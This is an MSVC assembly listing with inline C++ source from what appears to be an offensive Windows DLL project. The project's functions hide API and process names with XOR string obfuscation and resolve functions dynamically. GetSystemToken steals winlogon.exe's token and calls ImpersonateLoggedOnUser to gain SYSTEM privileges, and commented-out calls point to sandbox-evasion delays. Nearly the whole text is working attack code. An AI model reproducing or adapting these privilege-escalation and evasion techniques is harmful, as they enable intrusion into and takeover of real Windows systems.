; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN233@Clean

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	$LN308@Clean
$LN346@Clean:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	$LN243@Clean

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	lea	r15, QWORD PTR [rax+39]
	and	r15, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [r15-8], rax

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN230@Clean
$LN233@Clean:

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
	mov	r15, rax
$LN230@Clean:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	r8, rsi

; 2704 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	QWORD PTR $T1[rbp-96], r15

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	rdx, r12

; 2706 :         _My_data._Mysize = _Count;

	mov	QWORD PTR $T1[rbp-80], rsi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	rcx, r15

; 2707 :         _My_data._Myres  = _New_capacity;

	mov	QWORD PTR $T1[rbp-72], r14

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	call	memcpy

; 2713 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

	mov	BYTE PTR [r15+rsi], 0
$LN201@Clean:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 118  : 			FreeUsedLibrary(libInfo.first.c_str());

	lea	rcx, QWORD PTR $T1[rbp-96]
	call	?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::FreeUsedLibrary
$LN2@Clean:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 50   :         _Ptr = _Ptr->_Next;

	mov	rbx, QWORD PTR [rbx]

; 72   :         return _Ptr == _Right._Ptr;

	cmp	rbx, rdi
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 115  : 	for ( auto& libInfo : _loadedLibs )

	jne	$LN374@Clean
$LN3@Clean:

; 119  : 	}
; 120  : 
; 121  : 	FreeUsedLibrary(freqDLLS::kernel32);

	lea	rdx, OFFSET FLAT:?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	lea	rcx, QWORD PTR $T3[rbp-96]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rcx, rax
	call	?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::FreeUsedLibrary

; 122  : }

	lea	r11, QWORD PTR [rsp+96]
	mov	rbx, QWORD PTR [r11+56]
	mov	rsi, QWORD PTR [r11+64]
	mov	rdi, QWORD PTR [r11+72]
	mov	rsp, r11
	pop	r15
	pop	r14
	pop	r13
	pop	r12
	pop	rbp
	ret	0
$LN307@Clean:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2673 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
	int	3
$LN305@Clean:
	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
	int	3
$LN306@Clean:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN164@Clean:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN243@Clean:

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN308@Clean:

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN373@Clean:
?Clean@ProcessUtilities@@YAHXZ ENDP			; ProcessUtilities::Clean
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?GetSystemToken@ProcessUtilities@@YAPEAXXZ
_TEXT	SEGMENT
obfuscator$1 = 32
$T2 = 56
$T3 = 88
?GetSystemToken@ProcessUtilities@@YAPEAXXZ PROC		; ProcessUtilities::GetSystemToken, COMDAT

; 311  : HANDLE ProcessUtilities::GetSystemToken() {

$LN90:
	mov	QWORD PTR [rsp+16], rbx
	mov	QWORD PTR [rsp+24], rbp
	push	rsi
	push	rdi
	push	r14
	sub	rsp, 128				; 00000080H

; 312  : 	DWORD logonPID = PIDFromName(HIDE("winlogon.exe"));

	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	lea	r14, QWORD PTR [rax+rcx*8]
	mov	rsi, QWORD PTR [r14]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rsi]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4V45@A
	add	rbx, rsi
	test	al, 1
	jne	SHORT $LN70@GetSystemT
	or	eax, 1
	mov	DWORD PTR [rcx+rsi], eax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+10], 32478815		; 01ef965fH
	mov	DWORD PTR [rbx], -1622565340		; 9f499e24H
	mov	DWORD PTR [rbx+4], -708440448		; d5c60e80H
	mov	WORD PTR [rbx+8], 37501			; 0000927dH
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 312  : 	DWORD logonPID = PIDFromName(HIDE("winlogon.exe"));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN70@GetSystemT:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rbx+13], 0
	je	$LN20@GetSystemT

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	r8d, r8d
	cmp	DWORD PTR __isa_available, 5
	jl	$LN87@GetSystemT

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movdqa	xmm3, XMMWORD PTR __xmm@bba969eff327f753bba969eff327f753
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+2]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+2], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+4]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+4], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+6]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+6], ax

; 68   : 		for ( size_type i = 0; i < size; i++ )

	mov	r8d, 8
$LN87@GetSystemT:
	mov	r9, -4924288238255343789		; bba969eff327f753H
	npad	4
$LL86@GetSystemT:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, r8b
	and	cl, 7
	shl	cl, 3
	mov	rdx, r9
	shr	rdx, cl
	xor	BYTE PTR [rbx+r8], dl

; 68   : 		for ( size_type i = 0; i < size; i++ )

	inc	r8
	cmp	r8, 13
	jb	SHORT $LL86@GetSystemT

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [rbx+13], 0
$LN20@GetSystemT:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 312  : 	DWORD logonPID = PIDFromName(HIDE("winlogon.exe"));

	mov	rcx, rbx
	call	?PIDFromName@ProcessUtilities@@YAKPEBD@Z ; ProcessUtilities::PIDFromName

; 313  : 	if ( logonPID == 0 ) // bad process id

	test	eax, eax
	je	$LN82@GetSystemT

; 314  : 		return FALSE;
; 315  : 
; 316  : 	//SandboxCompromise::DelayOperation();
; 317  : 	HANDLE winlogon = CreateProcessAccessToken(logonPID);

	mov	ecx, eax
	call	?CreateProcessAccessToken@ProcessUtilities@@YAPEAXK@Z ; ProcessUtilities::CreateProcessAccessToken
	mov	rbx, rax

; 318  : 	if ( winlogon == NULL )

	test	rax, rax
	je	$LN82@GetSystemT

; 319  : 		return NULL;
; 320  : 
; 321  : 	HMODULE ntdll = GetLoadedLib(freqDLLS::advapi32);

	lea	rdx, OFFSET FLAT:?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	lea	rcx, QWORD PTR $T2[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rcx, rax
	call	?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetLoadedLib
	mov	rbp, rax

; 322  : 	PPROCFN::_ImpersonateLoggedOnUser _ImpersonateLoggedOnUser = GetFunctionAddress<PPROCFN::_ImpersonateLoggedOnUser>(ntdll, std::string(HIDE("ImpersonateLoggedOnUser")));

	movdqa	xmm0, XMMWORD PTR __xmm@96b046b2cf9ec9ac9db852afe68bd084
	mov	DWORD PTR obfuscator$1[rsp+16], -694816087 ; d695f2a9H
	mov	DWORD PTR obfuscator$1[rsp+20], -207272786 ; f3a544aeH
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rsi]
	mov	edi, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN81@GetSystemT
	or	eax, 1
	mov	DWORD PTR [rcx+rsi], eax
	lea	rax, QWORD PTR [rdi+rsi]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rax+24], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 322  : 	PPROCFN::_ImpersonateLoggedOnUser _ImpersonateLoggedOnUser = GetFunctionAddress<PPROCFN::_ImpersonateLoggedOnUser>(ntdll, std::string(HIDE("ImpersonateLoggedOnUser")));

	lea	rcx, QWORD PTR [rax+23]
	lea	rdx, QWORD PTR obfuscator$1[rsp+23]
	cmp	rax, rdx
	ja	SHORT $LN50@GetSystemT
	lea	rdx, QWORD PTR obfuscator$1[rsp]
	cmp	rcx, rdx
	jb	SHORT $LN50@GetSystemT
	movups	XMMWORD PTR [rax], xmm0
	movsd	xmm0, QWORD PTR obfuscator$1[rsp+16]
	movsd	QWORD PTR [rax+16], xmm0
	jmp	SHORT $LN76@GetSystemT
$LN50@GetSystemT:
	movups	XMMWORD PTR [rax], xmm0
	movsd	xmm0, QWORD PTR obfuscator$1[rsp+16]
	movsd	QWORD PTR [rax+16], xmm0
$LN76@GetSystemT:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN81@GetSystemT:
	lea	r11, QWORD PTR [rdi+rsi]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 140  : 			decrypt();

	mov	rcx, r11
	call	?decrypt@?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAXXZ ; ay::obfuscated_data<24,-876194367214469683,char>::decrypt
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 322  : 	PPROCFN::_ImpersonateLoggedOnUser _ImpersonateLoggedOnUser = GetFunctionAddress<PPROCFN::_ImpersonateLoggedOnUser>(ntdll, std::string(HIDE("ImpersonateLoggedOnUser")));

	mov	rdx, r11
	lea	rcx, QWORD PTR $T3[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rbp
	call	??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *)>

; 323  : 
; 324  : 	if ( !_ImpersonateLoggedOnUser(winlogon) ) {

	mov	rcx, rbx
	call	rax
	test	eax, eax
	jne	SHORT $LN4@GetSystemT

; 325  : 		SysNtClose(winlogon);

	mov	rcx, rbx
	call	SysNtClose
$LN82@GetSystemT:

; 332  : }

	xor	eax, eax
$LN1@GetSystemT:
	lea	r11, QWORD PTR [rsp+128]
	mov	rbx, QWORD PTR [r11+40]
	mov	rbp, QWORD PTR [r11+48]
	mov	rsp, r11
	pop	r14
	pop	rdi
	pop	rsi
	ret	0
$LN4@GetSystemT:

; 326  : 		return NULL;
; 327  : 	}
; 328  : 
; 329  : 	//SandboxCompromise::DelayOperation();
; 330  : 
; 331  : 	return winlogon;

	mov	rax, rbx
	jmp	SHORT $LN1@GetSystemT
?GetSystemToken@ProcessUtilities@@YAPEAXXZ ENDP		; ProcessUtilities::GetSystemToken
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$1 = 32
$T2 = 56
$T3 = 88
?dtor$2@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA PROC ; `ProcessUtilities::GetSystemToken'::`1'::dtor$2
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$2@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA ENDP ; `ProcessUtilities::GetSystemToken'::`1'::dtor$2
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$1 = 32
$T2 = 56
$T3 = 88
?dtor$3@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA PROC ; `ProcessUtilities::GetSystemToken'::`1'::dtor$3
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$3@?0??GetSystemToken@ProcessUtilities@@YAPEAXXZ@4HA ENDP ; `ProcessUtilities::GetSystemToken'::`1'::dtor$3
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?Init@ProcessUtilities@@YAHXZ
_TEXT	SEGMENT
$T1 = 32
$T2 = 64
$T3 = 64
$T4 = 64
?Init@ProcessUtilities@@YAHXZ PROC			; ProcessUtilities::Init, COMDAT

; 100  : BOOL ProcessUtilities::Init() {

$LN64:
	mov	QWORD PTR [rsp+16], rbx
	push	rdi
	sub	rsp, 96					; 00000060H

; 101  : 	// load required mods
; 102  : 	HMODULE kerneldll = GetModHandle(freqDLLS::kernel32);

	lea	rdx, OFFSET FLAT:?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	lea	rcx, QWORD PTR $T1[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rcx, rax
	call	?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetModHandle
	mov	rdi, rax

; 103  : 	HMODULE advapi = GetModHandle(freqDLLS::advapi32);

	lea	rdx, OFFSET FLAT:?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	lea	rcx, QWORD PTR $T4[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rcx, rax
	call	?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetModHandle
	mov	rbx, rax

; 104  : 	HMODULE ntdll = GetModHandle(freqDLLS::ntdll);

	lea	rdx, OFFSET FLAT:?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	lea	rcx, QWORD PTR $T3[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rcx, rax
	call	?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetModHandle

; 105  : 
; 106  : 	if ( kerneldll == NULL || advapi == NULL || ntdll == NULL )

	test	rdi, rdi
	je	$LN3@Init
	test	rbx, rbx
	je	$LN3@Init
	test	rax, rax
	je	$LN3@Init

; 109  : 	_FreeLibrary = GetFunctionAddress<PPROCFN::_FreeLibrary>(kerneldll, std::string(HIDE("FreeLibrary")));

	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4V45@A
	add	rbx, rdx
	test	al, 1
	jne	SHORT $LN52@Init
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	WORD PTR [rbx+11], 389			; 00000185H
	mov	DWORD PTR [rbx], -531882599		; e04c1d99H
	mov	DWORD PTR [rbx+4], -1719457739		; 99832835H
	mov	WORD PTR [rbx+8], 7614			; 00001dbeH
	mov	BYTE PTR [rbx+10], 80			; 00000050H
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 109  : 	_FreeLibrary = GetFunctionAddress<PPROCFN::_FreeLibrary>(kerneldll, std::string(HIDE("FreeLibrary")));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::Init'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN52@Init:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rbx+12], 0
	je	$LN21@Init

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	r8d, r8d
	cmp	DWORD PTR __isa_available, 5
	jl	$LN61@Init

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movdqa	xmm3, XMMWORD PTR __xmm@ebe1417985296fdfebe1417985296fdf
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+2]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+2], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+4]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+4], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+6]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+6], ax

; 68   : 		for ( size_type i = 0; i < size; i++ )

	mov	r8d, 8
$LN61@Init:
	mov	r9, -1449805614855655457		; ebe1417985296fdfH
	npad	3
$LL60@Init:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, r8b
	and	cl, 7
	shl	cl, 3
	mov	rdx, r9
	shr	rdx, cl
	xor	BYTE PTR [rbx+r8], dl

; 68   : 		for ( size_type i = 0; i < size; i++ )

	inc	r8
	cmp	r8, 12
	jb	SHORT $LL60@Init

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [rbx+12], 0
$LN21@Init:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 109  : 	_FreeLibrary = GetFunctionAddress<PPROCFN::_FreeLibrary>(kerneldll, std::string(HIDE("FreeLibrary")));

	mov	rdx, rbx
	lea	rcx, QWORD PTR $T2[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rdi
	call	??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetFunctionAddress<int (__cdecl*)(void *)>
